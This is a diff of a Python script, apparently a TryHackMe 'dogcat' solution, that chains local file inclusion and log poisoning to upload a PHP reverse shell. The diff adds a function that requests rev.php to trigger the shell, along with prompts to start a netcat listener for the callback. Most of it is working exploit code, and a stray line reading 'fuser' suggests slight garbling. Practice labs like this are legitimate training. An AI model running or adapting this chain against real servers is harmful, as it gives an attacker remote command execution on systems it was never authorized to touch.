@@ -1,15 +1,17 @@
 #!/usr/bin/python3
 
 #####
+# Script Author: Flikk
+# https://github.com/imflikk/tryhackme_solution_scripts
+#
 # Some practice using Python to automatically solve most of the 'dogcat'
 # machine from TryHackMe.com.  This script will confirm the LFI, read log
-# files, poison those log files, then upload a PHP reverse shell to the
-# web server.
+# files, poison those log files, upload a PHP reverse shell to the
+# web server, and finally activate the shell.
 #
 # Credit to TryHackMe.com for creating the dogcat machine
 #
-# Script Author: Flikk
-# https://github.com/imflikk/tryhackme_solution_scripts
+# Tested on ParrotOS with Python 3.8.2
 #####
 
 import argparse
@@ -90,6 +92,14 @@ def upload_shell(ip, url):
 		return True
 	else:
 		return False
+		
+def activate_rev_shell(ip, url):
+
+	shell_url = "http://" + ip + "/rev.php"
+	
+	print("Requesting " + shell_url + ", shell should be coming.\n")
+	activate_shell_r = requests.get(shell_url)
+	exit(0)
 	
 	
 	
@@ -102,13 +112,13 @@ def get_ip_address():
 def main():
 	
 	if len(sys.argv) < 2 or len(sys.argv) > 2:
-		print("Please use the format 'python3 dogcat.py <IP>'")
+		print("Please use the format 'python3 dogcat.py <target IP>'")
 		exit(0)
-		
+		fuser
 	ip = sys.argv[1]
 	url = "http://" + ip + "/?view="
 	
-	print("Before continuing, you need to download and edit the file below to include your IP and the port you want to listen on.\n")
+	print("Before continuing, you need to download and edit the file below to include your VPN (usually tun0) IP and the port you want to catch the reverse shell on.\n")
 	print("----https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php---\n")
 	
 	shell_available = input("Is this file updated, in your current directory, and named 'rev.php'?  (y/n)")
@@ -116,8 +126,15 @@ def main():
 	if shell_available.lower() == "n":
 		print("\nPlease follow the suggestion above before continuing.")
 		exit(0)
+		
+	print("\nPlease start a netcat listener on the port you set in rev.php (nc -lvnp <port>)")
+	nc_set = input("\nIs the listener started?  ")
 	
-	print("Target URL: " + url + "\n")
+	if nc_set.lower() != "y":
+		print("\nPlease start the netcat listener and re-run the script.")
+		exit(0)
+	
+	print("\nTarget URL: " + url + "\n")
 	print("Checking for LFI...\n")
 	sleep(1)
 
@@ -140,13 +157,9 @@ def main():
 		exit(0)
 		
 	if upload_shell(ip, url):
-		print("\nNext steps:")
-		print("\t-Start a netcat listener on the port you set in rev.php (nc -lvnp <port>)")
-		print("\t-Visit rev.php on the web server at http://" + ip + "/rev.php")
-		print("\t-Enjoy the shell and the rest of the box.\n")
-		
+		activate_rev_shell(ip, url)
+
 	
-		
 
 if __name__ == "__main__":
 	main()
